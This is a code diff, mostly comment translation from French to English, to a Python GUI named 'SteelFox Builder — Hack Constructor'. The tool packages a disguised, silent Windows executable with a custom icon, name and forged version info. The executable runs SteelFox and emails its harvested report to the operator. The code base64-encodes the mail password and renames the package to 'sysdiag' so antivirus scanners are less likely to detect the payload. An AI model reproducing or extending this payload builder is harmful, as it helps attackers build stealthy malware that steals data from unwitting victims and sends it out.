@@ -2,8 +2,8 @@
 # -*- coding: utf-8 -*-
 """
 SteelFox Builder — Hack Constructor
-Génère un exécutable furtif personnalisé (icône, nom) qui lance SteelFox
-en mode silencieux et envoie le rapport HTML par e-mail.
+Generates a custom stealthy executable (icon, name) that launches SteelFox
+in silent mode and sends the HTML report via email.
 """
 
 from __future__ import annotations
@@ -22,7 +22,7 @@ from tkinter import filedialog, messagebox, ttk
 import tkinter as tk
 from PIL import Image, ImageTk
 
-# ─── Constantes ──────────────────────────────────────────────────────────
+# ─── Constants ──────────────────────────────────────────────────────────
 ROOT_DIR   = Path(__file__).resolve().parent
 ASSETS_DIR = ROOT_DIR / "steelfox" / "assets"
 
@@ -43,7 +43,7 @@ FONT_SM   = ("Segoe UI", 9)
 _EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")
 
 
-# ─── Template du script généré ────────────────────────────────────────────
+# ─── Template of the generated script ─────────────────────────────────────
 # Entry-point script bundled inside the standalone executable.
 # Imports the core package (embedded by PyInstaller) and emails the HTML report.
 
@@ -153,7 +153,7 @@ if __name__ == "__main__":
 # ─── Widget helpers ───────────────────────────────────────────────────────
 
 def _set_dark_titlebar(window: tk.Tk) -> None:
-    """Force la barre de titre en mode sombre sur Windows 10/11."""
+    """Forces the title bar to dark mode on Windows 10/11."""
     try:
         window.update()
         import ctypes
@@ -197,10 +197,10 @@ def _separator(parent: tk.Widget) -> tk.Frame:
     return tk.Frame(parent, bg=BORDER, height=1)
 
 
-# ─── Application principale ───────────────────────────────────────────────
+# ─── Main Application ───────────────────────────────────────────────────
 
 class BuilderApp:
-    """Interface graphique du constructeur de payload SteelFox."""
+    """GUI for the SteelFox payload builder."""
 
     def __init__(self, root: tk.Tk) -> None:
         self.root = root
@@ -211,7 +211,7 @@ class BuilderApp:
         self._setup_window()
         self._build_ui()
 
-    # ── Configuration de la fenêtre ──────────────────────────────────────
+    # ── Window Configuration ───────────────────────────────────────────────
     def _setup_window(self) -> None:
         self.root.title("SteelFox Builder")
         self.root.geometry("550x780")
@@ -227,7 +227,7 @@ class BuilderApp:
             except Exception:
                 pass
 
-        # Style ttk uniquement pour le Combobox
+        # ttk style only for the Combobox
         style = ttk.Style()
         style.theme_use("default")
         style.configure(
@@ -239,11 +239,11 @@ class BuilderApp:
         )
         style.map("Dark.TCombobox", fieldbackground=[("readonly", BG3)])
 
-    # ── Construction de l'interface ──────────────────────────────────────
+    # ── Interface Construction ─────────────────────────────────────────────
     def _build_ui(self) -> None:
         root = self.root
 
-        # — En-tête —
+        # — Header —
         header = tk.Frame(root, bg=BG, pady=18)
         header.pack(fill="x", padx=24)
         
@@ -263,7 +263,7 @@ class BuilderApp:
 
         _separator(root).pack(fill="x")
 
-        # — Corps —
+        # — Body —
         body = tk.Frame(root, bg=BG2, pady=10)
         body.pack(fill="both", expand=True)
 
@@ -339,7 +339,7 @@ class BuilderApp:
         _entry(out_row, textvariable=self._outdir_var, width=36).pack(side="left")
         _btn(out_row, "...", self._pick_outdir).pack(side="left", padx=(6, 0))
 
-        # — Pied de page —
+        # — Footer —
         _separator(root).pack(fill="x")
         foot = tk.Frame(root, bg=BG, pady=16)
         foot.pack(fill="x", padx=24)
@@ -356,7 +356,7 @@ class BuilderApp:
         )
         self._status_lbl.pack(pady=(8, 0))
 
-    # ── Logique UI ───────────────────────────────────────────────────────
+    # ── UI Logic ──────────────────────────────────────────────────────────
     def _toggle_sender(self):
         if self._same_email_var.get():
             self._sender_entry.config(state="disabled")
@@ -413,7 +413,7 @@ class BuilderApp:
         if d:
             self._outdir_var.set(d)
 
-    # ── Validation des champs ─────────────────────────────────────────────
+    # ── Field Validation ──────────────────────────────────────────────────
     def _validate(self) -> bool:
         name     = self._name_var.get().strip()
         receiver = self._receiver_var.get().strip()
@@ -444,7 +444,7 @@ class BuilderApp:
                 
         return True
 
-    # ── Lancement de la construction (dans un thread) ────────────────────
+    # ── Launch build (in a thread) ─────────────────────────────────────────
     def _start_build(self) -> None:
         if not self._validate():
             return
@@ -453,7 +453,7 @@ class BuilderApp:
         threading.Thread(target=self._build_worker, daemon=True).start()
 
     def _build_worker(self) -> None:
-        """Tourne dans un thread secondaire pour ne pas geler l'interface."""
+        """Runs in a secondary thread to avoid freezing the interface."""
         name     = self._name_var.get().strip()
         receiver = self._receiver_var.get().strip()
         sender   = receiver if self._same_email_var.get() else self._sender_var.get().strip()
@@ -490,10 +490,10 @@ class BuilderApp:
         except Exception as exc:
             self.root.after(0, self._on_build_error, str(exc))
 
-    # ── Étapes de construction ────────────────────────────────────────────
+    # ── Construction Steps ────────────────────────────────────────────────
 
     def _copy_steelfox(self, tmp: Path) -> None:
-        """Copie le package steelfox et steelfox.py dans le dossier de build."""
+        """Copies the steelfox package and steelfox.py to the build directory."""
         src_pkg  = ROOT_DIR / "steelfox"
         src_main = ROOT_DIR / "steelfox.py"
 
@@ -508,7 +508,7 @@ class BuilderApp:
 
     @staticmethod
     def _write_version_info(tmp: Path, name: str) -> None:
-        """Génère un fichier VERSIONINFO Windows avec le nom personnalisé."""
+        """Generates a Windows VERSIONINFO file with the custom name."""
         ver = f"""# UTF-8
 VSVersionInfo(
   ffi=FixedFileInfo(
@@ -546,12 +546,12 @@ VSVersionInfo(
         (tmp / "version_info.txt").write_text(ver, encoding="utf-8")
 
     def _generate_payload(self, receiver: str, sender: str, password: str) -> str:
-        """Remplace les placeholders dans le template."""
+        """Replaces placeholders in the template."""
         enc = base64.b64encode(password.encode()).decode()
         return _PAYLOAD_TEMPLATE.replace("{RECEIVER}", receiver).replace("{SENDER}", sender).replace("{ENC_PASS}", enc)
 
     def _resolve_icon(self, tmp: Path) -> str:
-        """Retourne le chemin vers un .ico valide dans le dossier tmp."""
+        """Returns the path to a valid .ico file in the tmp folder."""
         if self._custom_icon_path:
             src = Path(self._custom_icon_path)
             if src.suffix.lower() in (".jpg", ".jpeg", ".png", ".bmp"):
@@ -585,8 +585,8 @@ VSVersionInfo(
     def _pyinstaller_build(
         self, tmp: Path, script: Path, name: str, icon: str,
     ) -> Path:
-        """Lance PyInstaller et retourne le chemin du .exe produit."""
-        # Obfusquer le code pour réduire les faux positifs AV
+        """Launches PyInstaller and returns the path to the produced .exe."""
+        # Obfuscate code to reduce anti-virus false positives
         # ── Rename package steelfox → sysdiag in the temp build dir ──────────
         # This removes all "steelfox" strings from the bundled code and replaces
         # the suspicious _MEI*\steelfox\core\privileges.py path with a neutral one.
@@ -673,7 +673,7 @@ VSVersionInfo(
         ]
         if icon:
             cmd += ["--icon", icon]
-        # Ajouter les infos de version Windows si disponibles
+        # Add Windows version info if available
         ver_file = tmp / "version_info.txt"
         if ver_file.exists():
             cmd += ["--version-file", str(ver_file)]
@@ -681,7 +681,7 @@ VSVersionInfo(
 
         result = subprocess.run(cmd, cwd=str(tmp), capture_output=True, text=True)
         if result.returncode != 0:
-            # Écrire le log complet dans un fichier pour diagnostic
+            # Write the full log to a file for diagnosis
             full_log = (result.stdout or "") + "\n" + (result.stderr or "")
             log_file = ROOT_DIR / "build_error.log"
             try:
@@ -702,7 +702,7 @@ VSVersionInfo(
             )
         return exe
 
-    # ── Callbacks UI (appelés depuis le thread principal via root.after) ─
+    # ── UI Callbacks (called from the main thread via root.after) ─────────
     def _set_status(self, text: str, color: str = FG_DIM) -> None:
         self.root.after(0, lambda: (
             self._status_var.set(text),
@@ -723,7 +723,7 @@ VSVersionInfo(
         messagebox.showerror("Build error", msg[:900])
 
 
-# ─── Point d'entrée ───────────────────────────────────────────────────────
+# ─── Entry Point ──────────────────────────────────────────────────────────
 
 def main() -> None:
     root = tk.Tk()
